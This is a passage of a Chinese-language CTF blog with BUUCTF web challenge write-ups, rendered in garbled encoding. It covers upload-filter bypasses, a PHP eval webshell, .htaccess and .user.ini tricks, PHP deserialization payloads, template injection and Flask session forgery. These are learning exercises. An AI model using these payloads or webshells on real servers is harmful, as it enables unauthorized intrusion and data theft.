2019]Upload"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Upload</h2><p>å…ˆåšä¸ªä¸€å¥è¯æœ¨é©¬ï¼Œä¸Šä¼ åæ˜¾ç¤º</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424222521044.png" alt="image-20210424222521044"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424184048567.png" alt="image-20210424184048567"></p><p>ç”¨bpæŠ“åŒ…ç„¶åä¿®æ”¹Content-Typeä¸ºimage/jpeg</p><p>  Content-Typeï¼ˆå†…å®¹ç±»å‹ï¼‰ï¼Œä¸€èˆ¬æ˜¯æŒ‡ç½‘é¡µä¸­å­˜åœ¨çš„ Content-Typeï¼Œç”¨äºå®šä¹‰ç½‘ç»œæ–‡ä»¶çš„ç±»å‹å’Œç½‘é¡µçš„ç¼–ç ï¼Œå†³å®šæµè§ˆå™¨å°†ä»¥ä»€ä¹ˆå½¢å¼ã€ä»€ä¹ˆç¼–ç è¯»å–è¿™ä¸ªæ–‡ä»¶ï¼Œ</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424191606823.png" alt="image-20210424191606823"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424184352223.png" alt="image-20210424184352223"></p><p>æ”¾åŒ…ååˆæ˜¾ç¤ºä¸èƒ½ä¸ºphp</p><p>ç™¾åº¦å¾—çŸ¥ç»•è¿‡åç¼€çš„æœ‰æ–‡ä»¶æ ¼å¼æœ‰php,</p><p>,php4,php5,phtml.pht</p><p>è¯•ä¸€è¯•</p><p>å‘ç°å¯ç”¨phtmlç»•è¿‡</p><p>ä½†åˆæç¤º</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424184937815.png" alt="image-20210424184937815"></p><p>æŠŠæ–‡ä»¶å†…å®¹æ”¹ä¸º</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424191120947.png" alt="image-20210424191120947"></p><p>åˆæç¤º</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424191418367.png" alt="image-20210424191418367"></p><p>åœ¨ä¸€å¥è¯æœ¨é©¬å‰åŠ ä¸ªæ–‡ä»¶å¤´GIF89a(GIF89aå›¾ç‰‡å¤´æ–‡ä»¶æ¬ºéª—)</p><p>Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.phtml&quot;<br>Content-Type: image/jpeg</p><p>GIF89a<script language="php"> @eval($_POST["a"]);</script></p><p>ä¸Šä¼ æˆåŠŸ</p><p>çŒœæµ‹ä¸Šä¼ åœ°å€ä¸º/upload/</p><p>èœåˆ€è¿æ¥</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424190843452.png" alt="image-20210424190843452"></p><p>åœ¨æ ¹ç›®å½•ä¸‹æ‰¾åˆ°flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424190943560.png" alt="image-20210424190943560"></p><h2 id="ACTF2020-æ–°ç”Ÿèµ›-Upload"><a href="#ACTF2020-æ–°ç”Ÿèµ›-Upload" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]Upload"></a>[ACTF2020 æ–°ç”Ÿèµ›]Upload</h2><p>æ–‡ä»¶ä¸Šä¼ ï¼Œå…ˆä¼ ä¸ªä¸€å¥è¯æœ¨é©¬è¯•è¯•</p><p>å¼¹å‡ºjsï¼Œ</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424215707910.png" alt="image-20210424215707910"></p><p>çœ‹ä¸€ä¸‹æºç </p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424215933835.png" alt="image-20210424215933835"></p><p>æŠŠè¿™ä¸ªäº‹ä»¶removeæ‰</p><p>ä¸Šä¼ ååˆæç¤º</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424215102729.png" alt="image-20210424215102729"></p><p>è¯•è¯•æ”¹æ”¹åç¼€åï¼Œå‘ç°phtmlå¯ä»¥æˆåŠŸä¸Šä¼ </p><p>èœåˆ€è¿æ¥</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424221314425.png" alt="image-20210424221314425"></p><p>åœ¨è™šæ‹Ÿç»ˆç«¯ä¸­åˆ©ç”¨catå‘½ä»¤æ‰¾åˆ°flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424221437332.png" alt="image-20210424221437332"></p><h2 id="ACTF2020-æ–°ç”Ÿèµ›-BackupFile"><a href="#ACTF2020-æ–°ç”Ÿèµ›-BackupFile" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]BackupFile"></a>[ACTF2020 æ–°ç”Ÿèµ›]BackupFile</h2><p>æ ¹æ®é¢˜ç›®å¾—çŸ¥æœ‰.bakçš„å¤‡ä»½æ–‡ä»¶ï¼Œè®¿é—®ä¸€ä¸‹index.php.bakå¾—åˆ°å¤‡ä»½æ–‡ä»¶</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424230600364.png" alt="image-20210424230600364"></p><p>ä»£ç å®¡è®¡å¯çŸ¥è¦ä¼ å…¥keyçš„å€¼ä¸strçš„å€¼ç›¸ç­‰ï¼Œä¸”keyåªèƒ½ä¸ºæ•°å­—ç±»å‹</p><p>å› ä¸º==æ˜¯å¼±ç±»å‹æ¯”è¾ƒï¼Œæ ¹æ®phpçš„æ€§è´¨å¯ä¼ å…¥?key=123</p><p>å¾—åˆ°flag</p><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-BuyFlag"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-BuyFlag" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]BuyFlag"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]BuyFlag</h2><p>åˆ°payflagçš„é¡µé¢å‘ç°æœ‰ä¸¤ä¸ªæ¡ä»¶</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424234920389.png" alt="image-20210424234920389"></p><p>æŸ¥çœ‹æºç </p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424235003731.png" alt="image-20210424235003731"></p><p>æŠ“ä¸ªåŒ…</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424235104576.png" alt="image-20210424235104576"></p><p>å°†useræ”¹ä¸º1å¯æ»¡è¶³ç¬¬ä¸€ä¸ªæ¡ä»¶</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424235148397.png" alt="image-20210424235148397"></p><p>ä¹‹åè¦ä»¥postæ–¹å¼ä¼ å…¥ä¸€ä¸ªå€¼ä»¤å…¶ç­‰äº404ä¸”ä¸èƒ½ä¸ºçº¯æ•°å­—</p><p>æ‰€ä»¥post password=404a</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424235248917.png" alt="image-20210424235248917"></p><p>æç¤ºè¦pay for the flag</p><p>çŒœæµ‹è¦postè¿›money=100000000</p><p>ä¼ å…¥åæç¤ºæ•°å­—è¿‡é•¿</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424235409212.png" alt="image-20210424235409212"></p><p>é‡‡ç”¨ç§‘å­¦è®¡æ•°æ³•ï¼Œå¾—åˆ°flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424235455547.png" alt="image-20210424235455547"></p><h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>è¿›å…¥åçœ‹èµ·æ¥åƒæ˜¯ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬çš„é¢˜</p><p>å…ˆä¼ ä¸€ä¸ªæ­£å¸¸çš„</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210501165659496.png" alt="image-20210501165659496"></p><p>æç¤ºillegal suffix!éæ³•åç¼€</p><p>æ”¹ä¸ªåç¼€åè¯•è¯•</p><p>æ”¹æˆ.jpgæ–‡ä»¶åæˆåŠŸç»•è¿‡ï¼Œä½†åˆæç¤º&lt;? in contents!</p><p>çŒœæµ‹&lt;?è¢«è¿‡æ»¤äº†</p><p>ä¿®æ”¹å</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210501165911275.png" alt="image-20210501165911275"></p><p>æœ€åå†åŠ ä¸ªGIF89aæ–‡ä»¶å¤´ï¼Œç»•è¿‡æœ€åä¸€ä¸ªexif_imagetypeå‡½æ•°çš„æ£€æµ‹</p><p>è™½ç„¶æˆåŠŸä¸Šä¼ äº†ä½†èœåˆ€æ— æ³•è¿æ¥</p><p>ç™¾åº¦ä¸€ä¸‹wp</p><p><strong>.user.ini</strong></p><p>ã€€1ã€auto_prepend_file åœ¨é¡µé¢é¡¶éƒ¨åŠ è½½æ–‡ä»¶<br>ã€€2ã€auto_append_file åœ¨é¡µé¢åº•éƒ¨åŠ è½½æ–‡ä»¶</p><p>æŸç½‘ç«™é™åˆ¶ä¸å…è®¸ä¸Šä¼ .phpæ–‡ä»¶ï¼Œå¯ä»¥ä¸Šä¼ ä¸€ä¸ª.user.iniï¼Œå†ä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡é©¬ï¼ŒåŒ…å«èµ·æ¥è¿›è¡Œgetshellã€‚åœ¨å«æœ‰.user.iniçš„æ–‡ä»¶å¤¹ä¸‹è¦æœ‰æ­£å¸¸çš„phpæ–‡ä»¶</p><p>å†ä¸Šä¼ ä¸€ä¸ª.user.ini</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210501170533467.png" alt="image-20210501170533467"></p><p>ä¸Šä¼ åæˆ‘ä»¬è®¿é—®æ­¤ç›®å½•ä¸‹çš„ä»»ä½•ä¸€ä¸ªæ–‡ä»¶æ—¶ï¼Œéƒ½ä¼šå»åŒ…å«first.jpg,</p><p>æ ¹æ®å…¶è¿”å›çš„åœ°å€ç”¨èœåˆ€è¿æ¥</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210501174943263.png" alt="image-20210501174943263"></p><p>æ‰¾åˆ°flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210501174705927.png" alt="image-20210501174705927"></p><h2 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210501204543745.png" alt="image-20210501204543745"></p><p>çœ‹è§file_get_contents(),åˆ©ç”¨ä¼ªåè®®data://text/plain;base64ç»•è¿‡</p><p>å†åˆ©ç”¨php://filterè¯»å–uselesså†…çš„å†…å®¹</p><p>è§£ç å</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210501183046395.png" alt="image-20210501183046395"></p><p>å¯çŸ¥flagåœ¨flag.phpä¸­</p><p>è¯•å›¾è®©file=flag.php</p><p>çœ‹åˆ°unserializeå‡½æ•°ï¼Œåˆ©ç”¨phpååºåˆ—åŒ–</p><p>æ„é€ payload</p><p>ï¼Ÿtext=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210501205224647.png" alt="image-20210501205224647"></p><p>æŸ¥çœ‹æºç æ‰¾åˆ°flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210501205239104.png" alt="image-20210501205239104"></p><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-PHP"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-PHP" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]PHP"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]PHP</h2><p>é¡µé¢ä¸­æç¤ºæœ‰å¤‡ä»½æ–‡ä»¶ï¼Œå¾¡å‰‘æ‰«ä¸€é</p><p>æ‰¾åˆ°å­˜åœ¨<a href="http://www.zip/">www.zip</a></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210501220739803.png" alt="image-20210501220739803"></p><p>é‡ç‚¹åœ¨class.phpå’Œindex.phpä¸­</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210501220822144.png" alt="image-20210501220309908"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210501220857753.png" alt="image-20210501220857753"></p><p>æ‰€ä»¥è¦ä¼ å…¥ä¸€ä¸ªselectå‚æ•°ï¼Œåˆ©ç”¨ååºåˆ—åŒ–è®©username=admin</p><p>password=100</p><p>å› ä¸ºusernameå’Œpasswordä¸¤ä¸ªä¸ºprivateç±»å‹</p><p>æ‰€ä»¥æœ‰éšè—çš„ç©ºæ ¼ç¬¦</p><p>select=O:4:&quot;Name&quot;:3:{s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;s:3:&quot;100&quot;;}&quot;</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210501220212731.png" alt="image-20210501220212731"></p><h2 id="MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢"><a href="#MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢" class="headerlink" title="[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢"></a>[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢</h2><p>å…ˆä¼ ä¸ª.htaccessæ–‡ä»¶ï¼Œä¸ºäº†è§£æå›¾ç‰‡ç </p><pre class="language-none"><code class="language-none">htaccessæ–‡ä»¶æ˜¯ApacheæœåŠ¡å™¨ä¸­çš„ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œå®ƒè´Ÿè´£ç›¸å…³ç›®å½•ä¸‹çš„ç½‘é¡µé…ç½®ã€‚é€šè¿‡htaccessæ–‡ä»¶ï¼Œå¯ä»¥å¸®æˆ‘ä»¬å®ç°ï¼šç½‘é¡µ301é‡å®šå‘ã€è‡ªå®šä¹‰404é”™è¯¯é¡µé¢ã€æ”¹å˜æ–‡ä»¶æ‰©å±•åã€å…è®¸&#x2F;é˜»æ­¢ç‰¹å®šçš„ç”¨æˆ·æˆ–è€…ç›®å½•çš„è®¿é—®ã€ç¦æ­¢ç›®å½•åˆ—è¡¨ã€é…ç½®é»˜è®¤æ–‡æ¡£ç­‰åŠŸèƒ½ã€‚ç¬¼ç»Ÿåœ°è¯´ï¼Œ.htaccesså¯ä»¥å¸®æˆ‘ä»¬å®ç°åŒ…æ‹¬ï¼šæ–‡ä»¶å¤¹å¯†ç ä¿æŠ¤ã€ç”¨æˆ·è‡ªåŠ¨é‡å®šå‘ã€è‡ªå®šä¹‰é”™è¯¯é¡µé¢ã€æ”¹å˜ä½ çš„æ–‡ä»¶æ‰©å±•åã€å°ç¦ç‰¹å®šIPåœ°å€çš„ç”¨æˆ·ã€åªå…è®¸ç‰¹å®šIPåœ°å€çš„ç”¨æˆ·ã€ç¦æ­¢ç›®å½•åˆ—è¡¨ï¼Œä»¥åŠä½¿ç”¨å…¶ä»–æ–‡ä»¶ä½œä¸ºindexæ–‡ä»¶ç­‰ä¸€äº›åŠŸèƒ½ã€‚</code></pre><pre class="language-none"><code class="language-none">SetHandler application&#x2F;x-httpd-php &#x2F;&#x2F;è¯¥è¯­å¥ä½œç”¨æ˜¯è®©Apacheå°†å…¶ä»–ç±»å‹æ–‡ä»¶å‡ä»¥phpæ ¼å¼è§£æ</code></pre><p>å†ä¼ ä¸ªä¸€å¥è¯æœ¨é©¬ï¼Œç„¶åbpæŠ“åŒ…</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210502142204069.png" alt="image-20210502142204069"></p><p>åªæœ‰å°†å…¶æ”¹ä¸ºå›¾ç‰‡çš„ç±»å‹æ‰èƒ½æˆåŠŸä¸Šä¼ </p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210502141437234.png" alt="image-20210502141437234"></p><p>æ ¹æ®è¿”å›çš„è·¯å¾„ç”¨èœåˆ€è¿æ¥</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210502141422576.png" alt="image-20210502141422576"></p><h2 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h2><p>è¿›å…¥åä»£ç å®¡è®¡</p><p>å…ˆgetè¿›ä¸¤ä¸ªmd5å€¼ç›¸ç­‰çš„å†…å®¹</p><p>md5æ— æ³•å¤„ç†æ•°ç»„ï¼Œä¼šè¿”å›NULLï¼Œä½¿å…¶ç›¸ç­‰</p><p>å†æ ¹æ®phpçš„ç‰¹æ€§postè¿›passwd=1234567aç»•è¿‡if</p><p>è·å¾—flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210502172416595.png" alt="image-20210502172416595"></p><h2 id="æŠ¤ç½‘æ¯-2018-easy-tornado"><a href="#æŠ¤ç½‘æ¯-2018-easy-tornado" class="headerlink" title="[æŠ¤ç½‘æ¯ 2018]easy_tornado"></a>[æŠ¤ç½‘æ¯ 2018]easy_tornado</h2><p>ä»æç¤ºå¯ä»¥çœ‹å‡ºæ¥è¿™ä¸ªtornadoæ˜¯ä¸€ä¸ªpythonçš„æ¨¡æ¿ï¼Œåœ¨webä½¿ç”¨çš„æ—¶å€™ç»™å‡ºäº†å››ä¸ªæ–‡ä»¶ï¼Œå¯ä»¥è®¿é—®ï¼Œä»æç¤ºä¸­å’Œurlä¸­å¯ä»¥çœ‹å‡ºï¼Œè®¿é—®éœ€è¦æ–‡ä»¶å+æ–‡ä»¶ç­¾åï¼ˆé•¿åº¦ä¸º32ä½ï¼Œè®¡ç®—æ–¹å¼ä¸ºmd5(cookie_secret + md5(filename))ï¼‰;  flagæ–‡ä»¶åé¢˜ç›®å·²ç»™å‡º /fllllllllllag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723131705440.png" alt="image-20210723131705440"></p><p>æ‰€ä»¥è¦åšçš„å°±æ˜¯è¦è·å¾—åˆ°cookieå€¼</p><p>è¿™é‡Œæ˜¯é‡‡ç”¨æ¨¡æ¿æ³¨å…¥çš„æ–¹å¼ </p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723132903953.png" alt="image-20210723132903953"></p><p>è¿™é‡Œå¯ä»¥çŒœå‡ºæ¥å­˜åœ¨æ¨¡æ¿æ³¨å…¥æ¼æ´è€Œä¸”åº”è¯¥å­˜åœ¨è¿‡æ»¤</p><p>ç„¶åç™¾åº¦çœ‹ä¸€ä¸‹wp</p><pre class="language-none"><code class="language-none">åœ¨Tornadoçš„å‰ç«¯é¡µé¢æ¨¡æ¿ä¸­ï¼ŒTornadoæä¾›äº†ä¸€äº›å¯¹è±¡åˆ«åæ¥å¿«é€Ÿè®¿é—®å¯¹è±¡ï¼Œå…·ä½“å®šä¹‰å¯ä»¥[å‚è€ƒTornadoå®˜æ–¹æ–‡æ¡£](http:&#x2F;&#x2F;tornado.readthedocs.org&#x2F;en&#x2F;latest&#x2F;guide&#x2F;templates.html#template-syntax)ï¼</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723135655762.png" alt="image-20210723135655762"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723135914756.png" alt="image-20210723135914756"></p><p>æ‰€ä»¥å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¥è¯»å–cookie_secret</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723140608282.png" alt="image-20210723140608282"></p><p>ç„¶åå¯¹å…¶è¿›è¡Œmd5åŠ å¯†å°±èƒ½å¾—åˆ°flagäº†</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723135951327.png" alt="image-20210723135951327"></p><h2 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h2><p><a href="https://blog.csdn.net/weixin_44677409/article/details/100733581">HCTF2018-admin_è¿·é£å°ç™½-CSDNåšå®¢</a></p><p>æ³¨å†Œä¸ªè´¦æˆ·ç™»å½•åå¯ä»¥åœ¨ä¿®æ”¹å¯†ç é¡µé¢çš„æºç æ³¨é‡Šä¸­æ‰¾åˆ°æç¤º</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723145616780.png" alt=" "></p><p>æŸ¥çœ‹å¯ä»¥æ‰¾åˆ°é¢˜ç›®æºç </p><p><strong>ä¸€ã€ sessionä¼ªé€ </strong></p><p>flaskä¸­sessionæ˜¯å­˜å‚¨åœ¨å®¢æˆ·ç«¯cookieä¸­çš„ï¼Œä¹Ÿå°±æ˜¯å­˜å‚¨åœ¨æœ¬åœ°ã€‚flaskä»…ä»…å¯¹æ•°æ®è¿›è¡Œäº†ç­¾åã€‚ä¼—æ‰€å‘¨çŸ¥çš„æ˜¯ï¼Œç­¾åçš„ä½œç”¨æ˜¯é˜²ç¯¡æ”¹ï¼Œè€Œæ— æ³•é˜²æ­¢è¢«è¯»å–ã€‚è€Œflaskå¹¶æ²¡æœ‰æä¾›åŠ å¯†æ“ä½œï¼Œæ‰€ä»¥å…¶sessionçš„å…¨éƒ¨å†…å®¹éƒ½æ˜¯å¯ä»¥åœ¨å®¢æˆ·ç«¯è¯»å–çš„</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723164939605.png" alt="image-20210723164939605"></p><p>æ‰¾åˆ°sessionååˆ©ç”¨pyè„šæœ¬è¿›è¡Œè§£ç </p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723163354906.png" alt="image-20210723163354906"></p><p>ä¾ç…§é¢˜æ„å¯ä»¥çŒœæµ‹åªæœ‰ç”¨adminè´¦æˆ·ç™»å½•æ‰èƒ½å¾—åˆ°flagï¼Œæ‰€ä»¥è¦ä¼ªé€ sessionæ¥ä½¿æˆ‘ä»¬è¢«è®¤ä¸ºæ˜¯adminè´¦æˆ·</p><p>é‡æ–°ç¼–ç sessionæ—¶éœ€è¦ç”¨åˆ°secret_keyå¯ä»¥åœ¨config.pyä¸­æ‰¾åˆ°</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723163710686.png" alt="image-20210723163710686"></p><p>ä¼ªé€ session</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723163828745.png" alt="image-20210723163828745"></p><p>ä¿®æ”¹ååˆ·æ–°é¡µé¢å¾—åˆ°flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723164748497.png" alt="image-20210723164748497"></p><p><strong>äºŒï¼šUnicodeæ¬ºéª—</strong></p><p>ä»£ç å®¡è®¡å¯ä»¥çœ‹å‡ºåœ¨ç™»å½•æ³¨å†Œå’Œä¿®æ”¹å¯†ç æ—¶éƒ½å­˜åœ¨ç”¨æˆ·åçš„å°å†™è½¬æ¢</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723165801699.png" alt="image-20210723165801699"></p><p>çœ‹ä¸€ä¸‹strlower</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723170037720.png" alt="image-20210723170037720"></p><p><code>Twisted</code>ç‰ˆæœ¬ä¸º<code>10.2.0</code>ï¼Œè€Œç›®å‰(2020/10/28)<code>Twisted</code>æœ€æ–°ç‰ˆæœ¬å·²æœ‰<code>20.3.0</code>ï¼Œè¿™é‡Œä½¿ç”¨çš„ç‰ˆæœ¬éå¸¸æ—§<br><code>10.2.0</code>ç‰ˆçš„<code>nodeprep.prepare()</code>å¯¹ä¸€äº›ç‰¹æ®Šçš„<code>Unicode</code>ç¼–ç å¤„ç†åä¼šå¾—åˆ°ä¸€ä¸ªæ­£å¸¸çš„å­—ç¬¦ã€‚å¯ä»¥çŸ¥é“å½“ä½¿ç”¨äº†nodeprep.prepare()å‡½æ•°ä¹‹åï¼Œå¦‚æœæˆ‘ä»¬å…ˆä½¿ç”¨unicodeçš„ç¼–ç çš„å­—ç¬¦ï¼Œæ¯”å¦‚è¯´ á´¬ ï¼Œä½¿ç”¨è¯¥å‡½æ•°ä¹‹åï¼Œä»–ä¼šå…ˆå˜æˆå¤§å†™çš„Aï¼Œå†ä½¿ç”¨ä¸€æ¬¡å°±ä¼šå˜æˆå°å†™çš„aã€‚</p><p>æ‰€ä»¥å¯ä»¥æ³¨å†Œä¸€ä¸ªá´¬á´°á´¹á´µá´ºç”¨æˆ·å†é€šè¿‡ç™»å½•å’Œä¿®æ”¹å¯†ç ä¸¤æ¬¡ä»¤å…¶å˜ä¸ºadmin</p><p><a href="https://unicode-table.com/en/">Basic Latin â€” âœ”ï¸ â¤ï¸ â˜… Unicode Character Table (unicode-table.com)</a>å¯ä»¥ä»è¿™ä¸ªç½‘ç«™æŸ¥å­—ç¬¦</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723172720848.png" alt="image-20210723172720848"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723172812674.png" alt="image-20210723172812674"></p><p>è¿™é‡Œç™»å½•ä¹‹åè¿›è¡Œä¿®æ”¹å¯†ç ï¼Œåˆ™é€šè¿‡å°å†™è½¬æ¢å°±ä¼šå˜ä¸ºä¿®æ”¹adminè´¦æˆ·çš„å¯†ç </p><p><img 